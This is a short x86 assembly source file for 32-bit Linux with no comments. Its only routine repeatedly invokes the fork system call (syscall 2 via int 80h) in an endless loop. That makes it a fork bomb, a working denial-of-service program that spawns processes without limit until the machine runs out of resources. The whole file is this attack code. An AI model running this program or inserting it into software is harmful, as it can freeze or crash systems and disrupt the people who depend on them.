SECTION .text
global _start

_start:
    mov eax, 2
    int 80h
    jmp _start